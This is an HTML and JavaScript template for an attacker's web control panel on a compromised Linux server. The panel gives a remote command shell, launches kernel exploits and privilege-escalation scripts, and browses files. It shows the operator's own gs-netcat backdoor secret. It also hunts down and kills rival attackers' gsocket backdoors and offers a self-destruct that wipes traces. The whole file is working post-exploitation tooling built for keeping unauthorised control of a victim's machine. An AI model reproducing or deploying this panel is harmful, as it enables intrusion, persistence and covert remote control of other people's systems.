<!DOCTYPE html><html><head><meta charset="UTF-8"><meta name="viewport" content="width=device-width,initial-scale=1"><title>DZ</title>
<link href="https://fonts.googleapis.com/css2?family=JetBrains+Mono:wght@400;500&family=Inter:wght@400;500&display=swap" rel="stylesheet">
<style>
*{margin:0;padding:0;box-sizing:border-box}
:root{--bg:#030304;--panel:#08090c;--card:#0c0d12;--glass:rgba(255,255,255,0.02);--border:rgba(255,255,255,0.05);--text:#9ca3af;--text2:#4b5563;--gold:#d4a012;--green:#10b981;--red:#ef4444;--blue:#3b82f6}
html,body{height:100%%;overflow:hidden}
body{font-family:'Inter',sans-serif;background:var(--bg);color:var(--text);font-size:12px}
.app{display:grid;grid-template-columns:54px 1fr 240px;height:100vh}
.sidebar{background:var(--panel);border-right:1px solid var(--border);display:flex;flex-direction:column;align-items:center;padding:14px 0;gap:4px}
.logo{width:30px;height:30px;background:linear-gradient(135deg,var(--gold),#b8860b);border-radius:6px;display:flex;align-items:center;justify-content:center;font-family:'JetBrains Mono';font-weight:700;font-size:10px;color:#000;margin-bottom:16px}
.nav-item{width:36px;height:36px;display:flex;align-items:center;justify-content:center;border-radius:8px;cursor:pointer;color:var(--text2);transition:all .15s}
.nav-item:hover{background:var(--glass);color:var(--text)}
.nav-item.on{background:rgba(212,160,18,0.1);color:var(--gold)}
.nav-item svg{width:16px;height:16px}
.nav-sep{width:20px;height:1px;background:var(--border);margin:8px 0}
main{background:var(--bg);overflow-y:auto;padding:16px}
.header{display:flex;align-items:center;justify-content:space-between;margin-bottom:16px}
.header h1{font-size:15px;font-weight:500}.header h1 span{color:var(--gold)}
.badge{display:flex;align-items:center;gap:5px;background:rgba(16,185,129,0.1);border:1px solid rgba(16,185,129,0.2);padding:5px 10px;border-radius:5px;font-size:9px;color:var(--green)}
.badge i{width:5px;height:5px;background:var(--green);border-radius:50%%;animation:pulse 2s infinite}
.badge.red{background:rgba(239,68,68,0.1);border-color:rgba(239,68,68,0.2);color:var(--red)}
.badge.red i{background:var(--red)}
@keyframes pulse{50%%{opacity:.4}}
.grid{display:grid;grid-template-columns:repeat(4,1fr);gap:8px;margin-bottom:12px}
.card{background:var(--card);border:1px solid var(--border);border-radius:8px;padding:12px}
.card.full{grid-column:1/-1}
.card.half{grid-column:span 2}
.card-title{font-size:8px;color:var(--text2);text-transform:uppercase;letter-spacing:1px;margin-bottom:8px}
.card-value{font-family:'JetBrains Mono';font-size:14px}
.term{background:#000;border:1px solid var(--border);border-radius:6px;overflow:hidden}
.term-bar{background:#111;padding:6px 10px;display:flex;align-items:center;gap:5px;border-bottom:1px solid var(--border)}
.term-dots{display:flex;gap:4px}
.term-dots span{width:8px;height:8px;border-radius:50%%}
.term-dots span:nth-child(1){background:#ff5f57}
.term-dots span:nth-child(2){background:#ffbd2e}
.term-dots span:nth-child(3){background:#28ca42}
.term-title{margin-left:auto;font-family:'JetBrains Mono';font-size:9px;color:var(--text2)}
.term-body{font-family:'JetBrains Mono';font-size:10px;padding:10px;min-height:100px;max-height:220px;overflow-y:auto;line-height:1.5}
.ln{margin:1px 0;padding-left:12px;position:relative}
.ln::before{content:'>';position:absolute;left:0;color:var(--text2);font-size:8px}
.ln.cmd{color:var(--gold)}.ln.cmd::before{content:'$';color:var(--gold)}
.ln.ok{color:var(--green)}.ln.ok::before{content:'‚úì';color:var(--green)}
.ln.err{color:var(--red)}.ln.err::before{content:'!';color:var(--red)}
.term-input{display:flex;background:#080808;border-top:1px solid var(--border)}
.term-input input{flex:1;background:transparent;border:none;padding:8px 10px;color:var(--text);font-family:'JetBrains Mono';font-size:10px;outline:none}
.term-input button{background:var(--gold);color:#000;border:none;padding:0 12px;font-size:9px;font-weight:600;cursor:pointer}
.exp{display:flex;align-items:center;padding:10px;background:var(--glass);border:1px solid var(--border);border-radius:6px;margin-bottom:4px;cursor:pointer;transition:all .15s}
.exp:hover{border-color:var(--gold);transform:translateX(2px)}
.exp-cve{font-family:'JetBrains Mono';font-size:10px;font-weight:600;width:110px;color:var(--gold)}
.exp-name{flex:1;font-size:10px;color:var(--text2)}
.exp-rate{font-family:'JetBrains Mono';font-size:10px;width:35px;text-align:right}
.exp-bar{width:60px;height:3px;background:var(--glass);border-radius:2px;margin-left:8px;overflow:hidden}
.exp-bar i{display:block;height:100%%;border-radius:2px}
.gs-item{background:var(--glass);border:1px solid var(--border);border-radius:6px;margin-bottom:8px;overflow:hidden}
.gs-item.danger{border-color:rgba(239,68,68,0.3);background:rgba(239,68,68,0.05)}
.gs-item.mine{border-color:rgba(16,185,129,0.3);background:rgba(16,185,129,0.05)}
.gs-header{display:flex;align-items:center;padding:10px;border-bottom:1px solid var(--border)}
.gs-type{font-size:8px;padding:2px 6px;border-radius:3px;margin-right:8px;text-transform:uppercase}
.gs-type.listener{background:rgba(239,68,68,0.2);color:var(--red)}
.gs-type.interactive{background:rgba(59,130,246,0.2);color:var(--blue)}
.gs-type.exec{background:rgba(212,160,18,0.2);color:var(--gold)}
.gs-type.file{background:rgba(139,92,246,0.2);color:#8b5cf6}
.gs-secret{font-family:'JetBrains Mono';font-size:11px;color:var(--gold);flex:1}
.gs-actions{display:flex;gap:4px}
.gs-body{padding:10px;font-size:9px;color:var(--text2)}
.gs-body table{width:100%%;border-collapse:collapse}
.gs-body td{padding:3px 0;vertical-align:top}
.gs-body td:first-child{color:var(--text2);width:70px}
.gs-body td:last-child{color:var(--text);font-family:'JetBrains Mono'}
.btn{background:linear-gradient(135deg,var(--gold),#b8860b);color:#000;border:none;padding:7px 14px;border-radius:4px;font-size:9px;font-weight:600;cursor:pointer}
.btn-sm{padding:4px 8px;font-size:8px}
.btn-ghost{background:var(--glass);border:1px solid var(--border);color:var(--text)}
.btn-red{background:var(--red);color:#fff}
.btn-blue{background:var(--blue);color:#fff}
.qs{display:flex;flex-wrap:wrap;gap:4px}
.qs span{padding:6px 10px;background:var(--glass);border:1px solid var(--border);border-radius:4px;font-size:9px;color:var(--text2);cursor:pointer}
.qs span:hover{border-color:var(--gold);color:var(--gold)}
.page{display:none}.page.on{display:block}
.rsb{background:var(--panel);border-left:1px solid var(--border);padding:12px;overflow-y:auto}
.rsb h3{font-size:9px;color:var(--text2);text-transform:uppercase;letter-spacing:1px;margin-bottom:10px}
.fm-path{font-family:'JetBrains Mono';font-size:9px;color:var(--text2);margin-bottom:8px}
.fm-path a{color:var(--gold);text-decoration:none}
.fm-item{display:flex;align-items:center;padding:7px;border-radius:5px;cursor:pointer;margin-bottom:1px}
.fm-item:hover{background:var(--glass)}
.fm-icon{width:24px;height:24px;display:flex;align-items:center;justify-content:center;background:var(--glass);border-radius:4px;margin-right:8px;font-size:11px}
.fm-icon.dir{background:rgba(212,160,18,0.1)}
.fm-name{font-size:10px;flex:1}
.fm-size{font-size:8px;color:var(--text2)}
.key-box{background:#000;border:1px solid var(--border);border-radius:4px;padding:10px;font-family:'JetBrains Mono';font-size:9px;color:var(--gold);word-break:break-all;cursor:pointer}
.live-stats{display:grid;grid-template-columns:1fr 1fr;gap:6px}
.live-stat{background:var(--glass);border-radius:4px;padding:8px}
.live-stat-label{font-size:8px;color:var(--text2);margin-bottom:2px}
.live-stat-value{font-family:'JetBrains Mono';font-size:12px}
.live-bar{height:2px;background:var(--border);border-radius:1px;margin-top:4px;overflow:hidden}
.live-bar i{height:100%%;border-radius:1px}
.progress{height:2px;background:var(--border);border-radius:1px;margin:6px 0;overflow:hidden}
.progress i{height:100%%;background:linear-gradient(90deg,var(--gold),var(--green))}
.alert{background:rgba(239,68,68,0.1);border:1px solid rgba(239,68,68,0.2);border-radius:6px;padding:12px;margin-bottom:12px;display:flex;align-items:center;gap:10px}
.alert-icon{font-size:18px}
.alert-text{flex:1;font-size:11px;color:var(--red)}
.alert-text strong{display:block;margin-bottom:2px}
</style></head>
<body>
<div class="app">
<nav class="sidebar">
<div class="logo">DZ</div>
<div class="nav-item on" data-p="dash" title="Dashboard"><svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2"><rect x="3" y="3" width="7" height="9"/><rect x="14" y="3" width="7" height="5"/><rect x="14" y="12" width="7" height="9"/><rect x="3" y="16" width="7" height="5"/></svg></div>
<div class="nav-item" data-p="exp" title="Exploits"><svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2"><path d="M13 2L3 14h9l-1 8 10-12h-9l1-8z"/></svg></div>
<div class="nav-item" data-p="scr" title="Scripts"><svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2"><polyline points="16 18 22 12 16 6"/><polyline points="8 6 2 12 8 18"/></svg></div>
<div class="nav-item" data-p="term" title="Terminal"><svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2"><polyline points="4 17 10 11 4 5"/><line x1="12" y1="19" x2="20" y2="19"/></svg></div>
<div class="nav-sep"></div>
<div class="nav-item" data-p="gs" title="GSockets"><svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2"><path d="M12 22s8-4 8-10V5l-8-3-8 3v7c0 6 8 10 8 10z"/></svg></div>
<div class="nav-item" data-p="proc" title="Processes"><svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2"><rect x="2" y="3" width="20" height="14" rx="2"/><line x1="8" y1="21" x2="16" y2="21"/></svg></div>
<div class="nav-item" data-p="net" title="Network"><svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2"><circle cx="12" cy="12" r="10"/><line x1="2" y1="12" x2="22" y2="12"/></svg></div>
<div style="margin-top:auto"><div class="nav-sep"></div>
<div class="nav-item" data-p="cfg" title="Config"><svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2"><circle cx="12" cy="12" r="3"/><path d="M12 1v6m0 6v10"/></svg></div>
<div class="nav-item" onclick="nuke()" title="Destruct" style="color:var(--red)"><svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2"><circle cx="12" cy="12" r="10"/><line x1="15" y1="9" x2="9" y2="15"/><line x1="9" y1="9" x2="15" y2="15"/></svg></div>
</div>
</nav>
<main>
<div id="p-dash" class="page on">
<div class="header"><h1>System <span>Overview</span></h1><div class="badge"><i></i>Online</div></div>
<div class="grid">
<div class="card"><div class="card-title">Kernel</div><div class="card-value" id="s_kernel">-</div></div>
<div class="card"><div class="card-title">User</div><div class="card-value" id="s_user">-</div></div>
<div class="card"><div class="card-title">Uptime</div><div class="card-value" id="s_up">-</div></div>
<div class="card"><div class="card-title">Memory</div><div class="card-value" id="s_mem">-</div></div>
</div>
<div id="gsalert"></div>
<div class="grid" style="grid-template-columns:1fr 1fr">
<div class="card"><div class="card-title">Resources</div><div class="live-stats" id="live"></div></div>
<div class="card"><div class="card-title">Quick</div><div class="qs"><span onclick="nav('exp')">‚ö°Exploits</span><span onclick="nav('gs')">üõ°GSocket</span><span onclick="nav('term')">‚ñ∏Shell</span><span onclick="pull()">‚ÜªUpdate</span></div></div>
</div>
<div class="card full"><div class="card-title">Vulnerability Scan</div><div id="scan"></div></div>
</div>
<div id="p-exp" class="page"><div class="header"><h1>Kernel <span>Exploits</span></h1></div><div class="card"><div id="expl"></div></div></div>
<div id="p-scr" class="page"><div class="header"><h1>Script <span>Runner</span></h1></div><div class="card"><div class="qs" style="margin-bottom:10px"><span onclick="rs('scripts/sysinfo.sh')">sysinfo</span><span onclick="rs('scripts/recon.sh')">recon</span><span onclick="rs('scripts/privesc.sh')">privesc</span><span onclick="rs('scripts/gscan.sh')">gscan</span></div><div style="display:flex;gap:6px"><input id="sp" style="flex:1;background:var(--glass);border:1px solid var(--border);padding:8px;border-radius:4px;color:var(--text);font-family:'JetBrains Mono';font-size:10px" placeholder="scripts/x.sh"><button class="btn" onclick="rs($('sp').value)">Run</button></div></div><div class="card" style="margin-top:10px"><div class="term"><div class="term-bar"><div class="term-dots"><span></span><span></span><span></span></div><div class="term-title">output</div></div><div class="term-body" id="so"></div></div></div></div>
<div id="p-term" class="page"><div class="header"><h1>Shell</h1></div><div class="card"><div class="term" style="height:calc(100vh - 140px)"><div class="term-bar"><div class="term-dots"><span></span><span></span><span></span></div><div class="term-title">bash</div></div><div class="term-body" id="to" style="max-height:calc(100vh - 220px)"></div><div class="term-input"><input id="tc" placeholder="$ command" onkeydown="event.key==='Enter'&&rc()"><button onclick="rc()">RUN</button></div></div></div></div>

<div id="p-gs" class="page">
<div class="header"><h1>GSSocket <span>Hunter</span></h1><div style="display:flex;gap:6px"><button class="btn btn-sm" onclick="scanGS()">üîç Deep Scan</button><button class="btn btn-sm btn-red" onclick="killAllGS()">‚ò† Kill All Others</button></div></div>
<div id="gscount"></div>
<div class="card"><div class="card-title">‚ö† Detected Backdoors</div><div id="gslist"></div></div>
<div class="card" style="margin-top:10px"><div class="card-title">üîí Your Access</div>
<div class="gs-item mine"><div class="gs-header"><span class="gs-type exec">YOURS</span><span class="gs-secret" id="mygs">%s</span></div>
<div class="gs-body"><table><tr><td>Connect:</td><td>gs-netcat -s %s</td></tr><tr><td>Status:</td><td style="color:var(--green)">‚óè Active</td></tr></table></div></div>
</div>
</div>

<div id="p-proc" class="page"><div class="header"><h1>Processes</h1><button class="btn btn-sm" onclick="loadProc()">Refresh</button></div><div class="card"><div class="term"><div class="term-bar"><div class="term-dots"><span></span><span></span><span></span></div><div class="term-title">ps</div></div><div class="term-body" id="po" style="max-height:400px"></div></div></div></div>
<div id="p-net" class="page"><div class="header"><h1>Network</h1><button class="btn btn-sm" onclick="loadNet()">Refresh</button></div><div class="card"><div class="term"><div class="term-bar"><div class="term-dots"><span></span><span></span><span></span></div><div class="term-title">connections</div></div><div class="term-body" id="no" style="max-height:400px"></div></div></div></div>
<div id="p-cfg" class="page"><div class="header"><h1>Config</h1></div><div class="grid" style="grid-template-columns:1fr 1fr"><div class="card"><div class="card-title">Deploy Key</div><div class="key-box" onclick="this.style.borderColor='var(--green)';navigator.clipboard.writeText(this.innerText)">%s</div></div><div class="card"><div class="card-title">URL</div><div class="key-box" onclick="this.style.borderColor='var(--green)';navigator.clipboard.writeText(this.innerText)">%s</div></div></div><div class="card" style="margin-top:10px"><div style="display:flex;gap:6px"><button class="btn" onclick="pull()">Update</button><button class="btn btn-ghost" onclick="rc2('id')">ID</button><button class="btn btn-red" onclick="nuke()">Destruct</button></div></div></div>
</main>
<div class="rsb">
<h3>Files</h3>
<div class="fm-path" id="bc"></div>
<div id="fls"></div>
</div>
</div>
<script>
const $=s=>document.getElementById(s);
const api=async(e,d)=>{try{return(await fetch('/api/'+e,{method:'POST',headers:{'Content-Type':'application/json'},body:JSON.stringify(d||{})})).json();}catch(x){return{error:x}}};
const log=(el,t,c)=>{if(!$(el))return;const d=document.createElement('div');d.className='ln '+(c||'');d.textContent=t;$(el).appendChild(d);$(el).scrollTop=1e9;};
document.querySelectorAll('.nav-item[data-p]').forEach(n=>n.onclick=()=>nav(n.dataset.p));
let cwd='/',mySecret='';
function nav(p){document.querySelectorAll('.page').forEach(x=>x.classList.remove('on'));document.querySelectorAll('.nav-item').forEach(x=>x.classList.remove('on'));$('p-'+p)?.classList.add('on');document.querySelector('.nav-item[data-p="'+p+'"]')?.classList.add('on');if(p==='exp')scan();if(p==='proc')loadProc();if(p==='net')loadNet();if(p==='gs')scanGS();}
async function init(){
mySecret=$('mygs').innerText;
const s=await api('run',{path:'scripts/sysinfo.sh'});
try{const d=JSON.parse(s.output||'{}');$('s_kernel').textContent=d.kernel||'-';$('s_user').textContent=d.user||'-';$('s_up').textContent=d.uptime||'-';$('s_mem').textContent=d.mem||'-';}catch(e){}
scanInit();ls(cwd);startLive();checkGSAlert();
}
async function checkGSAlert(){
const r=await api('run',{path:'scripts/gscan.sh'});
try{const d=JSON.parse(r.output||'{}');
const others=(d.gsockets||[]).filter(g=>g.secret&&g.secret!==mySecret&&g.secret!=='hidden'&&!g.type);
if(others.length>0){
$('gsalert').innerHTML=`<div class="alert"><span class="alert-icon">‚ö†Ô∏è</span><div class="alert-text"><strong>${others.length} Other GSockets Detected!</strong>Other hackers may have access. <a href="#" onclick="nav('gs');return false" style="color:var(--gold)">View & Kill ‚Üí</a></div></div>`;
}}catch(e){}}
function startLive(){async function u(){const r=await api('exec',{cmd:"cat /proc/loadavg|awk '{print $1}';free 2>/dev/null|awk '/Mem:/{print int($3*100/$2)}';df / 2>/dev/null|tail -1|awk '{gsub(/%/,\"\");print $5}'"});const[load,mem,disk]=(r.output||'0\n0\n0').trim().split('\n');$('live').innerHTML=`<div class="live-stat"><div class="live-stat-label">Load</div><div class="live-stat-value">${load}</div></div><div class="live-stat"><div class="live-stat-label">Mem</div><div class="live-stat-value">${mem}%%</div><div class="live-bar"><i style="width:${mem}%%;background:${mem>80?'var(--red)':'var(--green)'}"></i></div></div><div class="live-stat"><div class="live-stat-label">Disk</div><div class="live-stat-value">${disk}%%</div><div class="live-bar"><i style="width:${disk}%%;background:${disk>80?'var(--red)':'var(--green)'}"></i></div></div>`;}u();setInterval(u,4000);}
async function scanInit(){$('scan').innerHTML='<div class="progress"><i id="sp" style="width:0%%"></i></div><div id="sl"></div>';for(let i=0;i<4;i++){log('sl',['Kernel...','SUID...','Caps...','Done'][i]);$('sp').style.width=((i+1)*25)+'%%';await new Promise(r=>setTimeout(r,100));}const r=await api('run',{path:'exploits/gate.sh'});try{const d=JSON.parse(r.output||'{}');if(d.exploits?.length){d.exploits.forEach(x=>log('sl','‚úì '+x.cve,'ok'));let h='';d.exploits.slice(0,3).forEach(x=>{const c=x.rate>=80?'var(--green)':'var(--gold)';h+=`<div class="exp" onclick="nav('exp')"><span class="exp-cve">${x.cve}</span><span class="exp-name">${x.name}</span><span class="exp-rate" style="color:${c}">${x.rate}%%</span><div class="exp-bar"><i style="width:${x.rate}%%;background:${c}"></i></div></div>`;});$('scan').innerHTML+='<div style="margin-top:8px">'+h+'</div>';}}catch(e){log('sl','Error','err');}}
async function scan(){$('expl').innerHTML='Scanning...';const r=await api('run',{path:'exploits/gate.sh'});try{const d=JSON.parse(r.output||'{}');let h='';(d.exploits||[]).forEach(x=>{const c=x.rate>=80?'var(--green)':'var(--gold)';h+=`<div class="exp" onclick="runE('${x.cve}')"><span class="exp-cve">${x.cve}</span><span class="exp-name">${x.name}</span><span class="exp-rate" style="color:${c}">${x.rate}%%</span><div class="exp-bar"><i style="width:${x.rate}%%;background:${c}"></i></div></div>`;});$('expl').innerHTML=h||'No exploits';}catch(e){$('expl').innerHTML='Error';}}
async function runE(c){if(!confirm('Run '+c+'?'))return;const r=await api('run',{path:'exploits/'+c+'/run.sh'});alert(r.output||'Done');}
async function rs(p){if(!p)return;$('so').innerHTML='';log('so','$ '+p,'cmd');const r=await api('run',{path:p});(r.output||'').split('\n').forEach(l=>log('so',l,'ok'));}
async function rc(){const c=$('tc').value.trim();if(!c)return;$('tc').value='';log('to','$ '+c,'cmd');const r=await api('exec',{cmd:c});(r.output||'').split('\n').forEach(l=>log('to',l));}
async function rc2(c){$('to').innerHTML='';log('to','$ '+c,'cmd');const r=await api('exec',{cmd:c});(r.output||'').split('\n').forEach(l=>log('to',l));nav('term');}
async function loadProc(){$('po').innerHTML='';log('po','$ ps aux','cmd');const r=await api('exec',{cmd:'ps aux --sort=-%mem|head -30'});(r.output||'').split('\n').forEach(l=>log('po',l));}
async function loadNet(){$('no').innerHTML='';log('no','$ ss -tulpn','cmd');const r=await api('exec',{cmd:'ss -tulpn 2>/dev/null||netstat -tulpn'});(r.output||'').split('\n').forEach(l=>log('no',l));}

async function scanGS(){
$('gslist').innerHTML='<div style="padding:20px;text-align:center;color:var(--text2)">Deep scanning...</div>';
const r=await api('run',{path:'scripts/gscan.sh'});
try{
const d=JSON.parse(r.output||'{}');
const items=d.gsockets||[];
const procs=items.filter(g=>!g.type);
const files=items.filter(g=>g.type==='file');
const persistence=items.filter(g=>g.type==='cron'||g.type==='systemd');
const others=procs.filter(g=>g.secret!==mySecret);

$('gscount').innerHTML=others.length>0?
`<div class="alert"><span class="alert-icon">üö®</span><div class="alert-text"><strong>${others.length} HOSTILE GSOCKET${others.length>1?'S':''} DETECTED!</strong>Other attackers have backdoor access to this system.</div><button class="btn btn-sm btn-red" onclick="killAllGS()">Kill All</button></div>`:'';

let h='';
procs.forEach(g=>{
const isMine=g.secret===mySecret;
h+=`<div class="gs-item ${isMine?'mine':'danger'}">
<div class="gs-header">
<span class="gs-type ${g.mode}">${g.mode}</span>
<span class="gs-secret">${g.secret}</span>
<div class="gs-actions">
${isMine?'<span style="color:var(--green);font-size:9px">YOURS</span>':`<button class="btn btn-sm btn-red" onclick="killGS(${g.pid})">Kill</button>`}
</div>
</div>
<div class="gs-body"><table>
<tr><td>PID:</td><td>${g.pid}</td></tr>
<tr><td>User:</td><td>${g.user}</td></tr>
<tr><td>Started:</td><td>${g.start||'?'}</td></tr>
<tr><td>Parent:</td><td>${g.parent}</td></tr>
<tr><td>Conns:</td><td>${g.conns} active</td></tr>
<tr><td>Binary:</td><td style="font-size:8px">${g.exe||'?'}</td></tr>
</table></div>
</div>`;
});

if(files.length){
h+='<div style="margin-top:12px;font-size:9px;color:var(--text2);margin-bottom:6px">üìÅ GSSocket Files</div>';
files.forEach(f=>{
h+=`<div class="gs-item danger"><div class="gs-header"><span class="gs-type file">FILE</span><span class="gs-secret">${f.path}</span><div class="gs-actions"><button class="btn btn-sm btn-red" onclick="delFile('${f.path}')">Delete</button></div></div><div class="gs-body"><table><tr><td>Owner:</td><td>${f.owner}</td></tr><tr><td>Modified:</td><td>${f.mtime}</td></tr><tr><td>Content:</td><td>${f.content}</td></tr></table></div></div>`;
});
}

if(persistence.length){
h+='<div style="margin-top:12px;font-size:9px;color:var(--text2);margin-bottom:6px">‚è∞ Persistence Found</div>';
persistence.forEach(p=>{
h+=`<div class="gs-item danger"><div class="gs-header"><span class="gs-type" style="background:rgba(239,68,68,0.3)">${p.type.toUpperCase()}</span><span style="flex:1;font-size:9px;color:var(--text2)">${p.content?.substring(0,100)}</span></div></div>`;
});
}

$('gslist').innerHTML=h||'<div style="padding:20px;text-align:center;color:var(--green)">‚úì No other gsockets detected</div>';
}catch(e){$('gslist').innerHTML='<div style="color:var(--red)">Scan error</div>';}
}

async function killGS(pid){if(!confirm('Kill PID '+pid+'?'))return;await api('exec',{cmd:'kill -9 '+pid});scanGS();}
async function killAllGS(){if(!confirm('Kill ALL other gsockets?'))return;const r=await api('run',{path:'scripts/gscan.sh'});try{const d=JSON.parse(r.output||'{}');const pids=(d.gsockets||[]).filter(g=>!g.type&&g.secret!==mySecret).map(g=>g.pid);if(pids.length){await api('exec',{cmd:'kill -9 '+pids.join(' ')});alert('Killed '+pids.length+' processes');scanGS();}}catch(e){}}
async function delFile(p){if(!confirm('Delete '+p+'?'))return;await api('exec',{cmd:'rm -f "'+p+'"'});scanGS();}

async function ls(p){cwd=p;$('bc').innerHTML=p.split('/').filter(Boolean).reduce((a,x,i,arr)=>`${a}/<a href="#" onclick="ls('/'+this.dataset.p);return false" data-p="${arr.slice(0,i+1).join('/')}">${x}</a>`,'<a href="#" onclick="ls(\'/\');return false">~</a>');const d=await api('files',{path:p});let h='';if(p!=='/'){const pr=p.split('/').slice(0,-1).join('/')||'/';h+=`<div class="fm-item" onclick="ls('${pr}')"><div class="fm-icon dir">‚Üë</div><div class="fm-name">..</div></div>`;}(d.files||[]).sort((a,b)=>(b.type==='dir')-(a.type==='dir')).forEach(f=>{const np=p==='/'?'/'+f.name:p+'/'+f.name;const dir=f.type==='dir';h+=`<div class="fm-item" onclick="${dir?`ls('${np}')`:'0'}"><div class="fm-icon ${dir?'dir':''}">${dir?'üìÅ':'üìÑ'}</div><div class="fm-name">${f.name}</div><div class="fm-size">${f.size||''}</div></div>`;});$('fls').innerHTML=h||'Empty';}
async function pull(){await api('pull');location.reload();}
async function nuke(){if(!confirm('DESTRUCT?'))return;await api('destruct');document.body.innerHTML='<div style="display:flex;height:100vh;align-items:center;justify-content:center;background:#000;color:var(--red);font-size:20px">DESTROYED</div>';}
init();
</script>
</body></html>
